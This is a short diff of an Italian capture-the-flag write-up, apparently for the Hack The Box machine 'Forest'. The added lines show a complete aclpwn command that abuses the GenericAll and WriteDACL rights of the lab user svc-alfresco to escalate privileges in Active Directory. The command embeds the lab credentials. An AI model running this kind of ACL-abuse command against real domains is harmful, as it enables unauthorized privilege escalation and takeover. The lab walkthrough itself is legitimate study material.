@@ -73,4 +73,7 @@ Osservo l'albero dell'ActiveDirectory e scopro che l'utente ha di base due perme
 * GenericAll
 * WriteDACL
 
-Li sfrutto per ? 
+Sfrutto aclpwn per exploitare da remoto la vulnerabilità presente nelle AD
+```
+aclpwn -f svc-alfresco@htb.local -ft User -t htb.local -d htb.local -du neo4j -dp PWD -s 10.10.10.161 -u svc-alfresco -sp s3rvice
+```
